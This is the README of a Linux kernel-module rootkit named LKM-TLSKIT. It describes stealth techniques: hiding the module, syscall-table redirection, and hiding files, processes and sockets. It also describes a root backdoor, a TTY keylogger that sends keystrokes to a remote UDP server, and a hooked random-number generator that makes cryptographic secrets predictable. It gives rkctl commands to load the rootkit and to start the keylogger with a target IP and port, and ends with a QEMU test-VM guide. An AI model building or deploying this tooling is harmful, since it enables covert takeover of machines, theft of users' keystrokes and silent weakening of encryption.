# LKM-TLSKIT

A Linux rootkit, based on a Linux Kernel Module.

> This rootkit has been developed on Linux kernel version 4.19.0-12-amd64
on Debian Booster 10.6.0

## Features

* **Module hiding:** 

The kernel module is hidden from lsmod and /sys/module. This is done by remapping
the module's core layout such that the memory of the rootkit is unlinked from the kernel
module. It allows unloading the kernel module and destroying all the corresponding files,
while keeping the rootkit alive. This approach seems to be more stealthy than just hiding
the module via syscall hooking and removing the module from internal kernel lists.
     
* **SYSCALL hooking:**

The rootkit supports syscall hooking by redirecting syscalls from the user-space to 
a faked syscall table. In this ways, integrity checks on the syscall table will pass, since
the original syscall table will never be modified. In contrast, integrity checks on the
code itself will detect the rootkit, but due to runtime-patching of the kernel, 
this is more difficult to achieve.

The technique uses pattern matching on assembly code, starting at the address where the 
LSTAR MSR register points to (either entry_SYSCALL_64 or entry_SYSCALL_64_trampoline).

When the pattern matching fails (e.g. when different compiler versions are used that 
implements different optimizations) we will simply override the syscall table instead,
which is less stealthy and allows rootkit detection via syscall table integrity checks. 

* **File hiding:**

Files that contain the "user.rootkit" extended attribute are hidden from the user space
by hooking the getdents(64) syscall.

Extended attributes can be set via the *setfattr* tool.

* **Privilege Escalation via Backdoor:**

Execute an arbitrary program as root.

* **Process hiding:**

Process hiding is implemented by filtering the /proc directory. Tools, such as
*ps* will create a process list based on the files in the */proc* directory. 

Hidden processes can be detected from a hypervisor using the *lx-ps* gdb script, which
lists all processes based on the task_struct list, instead of checking the /proc directory.
To avoid this kind of detection, the corresponding task_struct is removed from the internal
tasks list. (This does not work for children of hidden tasks, yet.)

It must be ensured that the task list contains the task_struct of a task that is terminated or
killed, otherwise the kernel would panic. Therefore, the *do_exit* function is hooked via the 
ftrace hooking technique to reinsert the task into the tasks list, before the real *do_exit* 
function will be executed. 
Further, the proc filter is removed for the corresponding pid, such that the
process is only hidden during its lifetime and not for upcoming processes that obtain the same pid.

* **Socket hiding:**

A TCP or UDP socket can be hidden from user space regarding its assigned port. This is implemented by hooking the *recvmsg()* syscall 
and the *show()* methods of the udp, udp6, tcp and tcp6 sequence operations from the */proc* directory.

* **Keylogger:**

A keylogger that hooks the tty->read function to receive all the input data from TTY/PTY
pseudoterminals, which is used for the user interface, ssh, docker, ...
The data will then be sent to a UDP server, control characters will be parsed to a specific string format.

* **CSPRNG hooking:**

The rootkit hooks the cryptographic secure pseudo random number generator (CSPRNG) from the
operating system and returns predictable random values, which allows the recalculation
of secrets generated by cryptographic libraries from the userspace (e.g. openssl). 
In case of Linux, this is */dev/random*, */dev/urandom* and the *getrandom()* syscall.

* **TCP Port knocking:**

Port knocking is based on [1]. If a port is hidden, only authorized clients who have set the ISN of the TCP SYN to a 
specific value, can connect. The ISN is calculated as follows:

Hash1 = sha256(secret), Hash_final = sha256(Hash1 | sport | dport | saddr)

ISN = Hash1[0..3]

Here, secret is a (at most 63 byte) shared secret and the source port, the destination port and the source ip are in 
host byte order.
All TCP packets from unauthorized clients will be filtered (we never send TCP RST), such that port scanners like 'nmap' 
will always receive the state 'filtered' (or 'open|filtered' in case of sF, sX, sN scans).

You can test port knocking using the TCP test client from the tcp_client package. It makes use of raw sockets to set the
ISN. For more details, see tcp_client/README.md.

## Build dependencies

`apt-get install linux-headers-$(uname -r)`

## Build

A Makefile is provided for building the kernel module rootkit and its user-space
control program:

``make``

## Installation

The installation of the tlskit is done via the user-space control program.
See ***load*** and ***unload*** in the **Usage** section.

## Usage
The rootkit can be controlled via a user-space control program. 

The rootkit control program supports the following commands:

* ***Help Menu:***

    Print a help menu:

    ``./rkctl help``

* ***Ping:*** 

    Check if the rootkit is currently alive: 

    ``./rkctl ping``

* ***Load:***

    Load the kernel module and install the rootkit: 

    ``./rkctl load <module.ko>``

* ***Unload:***

    Unload the rootkit: 

    ``./rkctl unload``
    
* ***Backdoor:***

    Run an arbitrary program as root (e.g. root shell via /bin/sh): 

    ``./rkctl backdoor <program>``
    
* ***Start Keylogger:***   
 
    Start a keylogger, given a UDP server at <ip>:<port> (e.g. via netcat: nc -lu -p 1234)

    ``./rkctl keylog_start <ip> <port>``

* ***Stop Keylogger:***
    
    ``./rkctl keylog_stop``
    
* ***Hide a Process:***

    Hide a process and all its successors by pid (can be tested by tools like *ps* or *top*): 

    ``./rkctl hidepid_add <pid>``
    
* ***Unhide a Process:***

    Unhide a hidden process and all its successors by pid: 

    ``./rkctl hidepid_rm <pid>``
    
* ***Hide a Socket:***

    Hide a socket, given its port (can be verified by using 'netstat -tunpa' or 'ss -tunpa'): 

    ``./rkctl hide_socket <port>``
    
* ***Unhide a Socket:***

    Unhide a TCP or UDP socket, given its port: 

    ``./rkctl unhide_socket <port>``

* ***Hiding Files:***

    To hide or unhide files or directories, the xattr helper program can be used. Either one or multiple paths, seperated by space,
    can be passed as arguments:

    ``./xattr hide <path> ...``

    ``./xattr unhide <path> ...``

* ***Port Knocking:***

    Protect a specific TCP port by a (at most 63 byte) secret:

    ``./rkctl port_knocking_add <port> <secret>``

    Unprotect a hidden port:

    ``./rkctl port_knocking_rm <port>``


## Setting up a virtualized environment for testing (Ubuntu guide)

#### Download Debian Booster
Download debian-10.6.0-amd64-netinst.iso

#### Install QEMU
`sudo apt install qemu-system-x86`

#### Enable VM Hardware Support
If not yet done, enable hardware support in your BIOS/UEFI, which allows using the -enable-kvm flag for hardware
acceleration.
For more details, see https://wik.ubuntuuser.de/KVM/.

#### Create empty image
`qemu-img create -f qcow2 <rk>.img 20G`

#### Install debian image
Run the following command, where <rk.img> is your empty image from the previous step and <debian.iso> is the debian booster image.
Afterwards, follow the installation guide and enable ssh server when asked.

`qemu-system-x86_64 -enable-kvm -cpu host -hda <rk.img> -cdrom <debian.iso> -boot d -m 2048`

#### Create an overlay image
Good practice might be to have an overlay image separated from a clean backup to avoid
re-installation effort when something goes wrong during the Rootkit development:

`qemu-img create -b <rk.img> -f qcow2 <rk.ovl>`

#### Boot Debian with SSH server

`qemu-system-x86_64 -enable-kvm -cpu host -hda <rk.ovl> -m 2048 -nic user,hostfwd=tcp::10022-:22`

You can use option -s for running a GDB server at port TCP:1234 and -S for freezing
the VM before the kernel is executed (might be helpful for debugging at an early kernel stage).

#### Connect from host to VM via SSH

`ssh -p 10022 localhost`

Files can be transferred via scp.

## Future Work
- Packet Hiding
- Hiding tmp files
- Persistence
- Cracking local TLS connections by traffic analysis and the help of the hooked CSPRNG
  
[1] https://git.gnunet.org/bibliography.git/plain/docs/knock.pdf